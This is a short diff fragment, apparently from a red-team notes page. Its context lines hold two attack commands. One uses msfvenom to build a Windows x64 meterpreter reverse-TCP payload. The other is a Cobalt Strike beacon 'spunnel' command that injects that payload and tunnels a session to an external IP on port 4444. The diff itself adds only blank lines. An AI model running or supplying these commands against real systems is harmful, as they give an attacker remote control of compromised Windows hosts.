@@ -18,3 +18,5 @@ updated_at: '2023-04-10T20:36:22.875975+00:00'
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
 beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
 ```
+
+
